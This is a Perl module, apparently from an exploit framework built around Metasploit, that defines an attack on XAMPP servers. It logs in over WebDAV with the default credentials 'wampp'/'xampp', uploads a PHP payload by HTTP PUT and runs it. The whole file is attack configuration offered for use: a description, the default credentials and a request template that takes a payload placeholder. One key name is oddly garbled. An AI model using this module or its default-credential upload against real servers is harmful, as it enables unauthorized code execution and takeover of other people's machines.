package XAMPP::MSF::XamppWebdavUploadPhp;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "XamppWebdavUploadPhp";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

          This module exploits weak WebDAV passwords on XAMPP servers.

          It uses supplied credentials to upload a PHP payload and

          execute it.

      ",
  "MSF_MODULE" => "xampp_webdav_upload_php",
  "THE HTTP USERTITLE TO SPECIFY FOR AUTHENTICATION" => "wampp",
  "TITLE" => "XAMPP WebDAV PHP Upload",
  VARIABLES => {
    'PASSWORD' =>       {
  DESCRIPTION => "The HTTP password to specify for authentication",
  VALUE => "xampp",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'PUT',
      PATH   => '__FILENAME__.php',
      PAYLOAD      => '__PAYLOAD__',
      TEXT   => 'Sending Exploit #1 Request : [PUT] /__FILENAME__.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
